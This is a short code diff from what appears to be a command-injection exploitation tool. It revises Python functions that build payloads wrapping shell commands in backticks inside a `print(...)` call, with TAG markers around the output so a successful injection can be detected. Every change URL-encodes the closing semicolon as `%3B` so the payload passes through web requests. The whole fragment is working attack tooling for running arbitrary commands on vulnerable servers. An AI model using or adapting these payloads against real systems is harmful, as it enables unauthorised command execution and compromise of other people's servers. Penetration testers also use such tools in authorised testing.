@@ -26,7 +26,7 @@ def decision(separator, TAG, randv1, randv2):
     payload = ("print(`echo " + TAG + "`." +
                 "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
                 "`echo " + TAG + "`." +
-                "`echo " + TAG + "`);" +
+                "`echo " + TAG + "`)%3B" +
                 separator
               )
     
@@ -34,7 +34,7 @@ def decision(separator, TAG, randv1, randv2):
     payload = ("print(`echo " + TAG + "" +
                 separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" + "" +
                 separator + "echo " + TAG + "" +
-                separator + "echo " + TAG + "`);"
+                separator + "echo " + TAG + "`)%3B"
               )
   return payload
 
@@ -46,7 +46,7 @@ def cmd_execution(separator, TAG, cmd):
                 "`echo " + TAG + "`." +
                 "`" + cmd + "`." +
                 "`echo " + TAG + "`." +
-                "`echo " + TAG + "`);"
+                "`echo " + TAG + "`)%3B"
               )
     
   else:
@@ -54,7 +54,7 @@ def cmd_execution(separator, TAG, cmd):
                 separator + "echo '" + TAG + "'" +
                 separator + cmd  +
                 separator + "echo '" + TAG + "'" +
-                separator + "echo '" + TAG + "'`);"
+                separator + "echo '" + TAG + "'`)%3B"
               )
   
   return payload
